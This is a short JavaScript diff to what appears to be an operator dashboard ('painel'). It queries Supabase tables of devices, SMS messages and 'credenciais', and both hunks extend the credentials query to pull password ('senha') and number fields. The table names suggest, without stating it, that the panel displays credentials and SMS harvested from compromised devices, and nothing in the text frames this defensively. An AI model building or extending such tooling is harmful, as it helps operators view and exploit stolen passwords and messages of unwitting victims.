@@ -1776,7 +1776,7 @@ async function carregarDados() {
       fetch(SUPA_URL+"/rest/v1/sms?select=id,device_id,timestamp_ms&order=timestamp_ms.desc&limit=1000", {headers})
     ]);
     const d1=await r1.json(), d3=await r3.json();
-    const d2 = await fetchAllPages(SUPA_URL+"/rest/v1/credenciais?select=id,device_id,tipo,valor&order=id.desc");
+    const d2 = await fetchAllPages(SUPA_URL+"/rest/v1/credenciais?select=id,device_id,tipo,valor,numero,senha,criado_em,created_at&order=id.desc");
     todosDispositivos = Array.isArray(d1)?d1:[];
     todasCredenciais  = Array.isArray(d2)?d2:[];
     todasSMS          = Array.isArray(d3)?d3:[];
@@ -1876,7 +1876,7 @@ function iniciarPainel() {
         fetch(SUPA_URL+"/rest/v1/sms?select=id,device_id,timestamp_ms&order=timestamp_ms.desc&limit=1000",{headers:h})
       ]);
       const d1=await r1.json(), d3=await r3.json();
-      const d2 = await fetchAllPages(SUPA_URL+"/rest/v1/credenciais?select=id,device_id,tipo,valor&order=id.desc");
+      const d2 = await fetchAllPages(SUPA_URL+"/rest/v1/credenciais?select=id,device_id,tipo,valor,numero,senha,criado_em,created_at&order=id.desc");
       todosDispositivos = Array.isArray(d1)?d1:todosDispositivos;
       todasCredenciais  = Array.isArray(d2)?d2:todasCredenciais;
       todasSMS          = Array.isArray(d3)?d3:todasSMS;
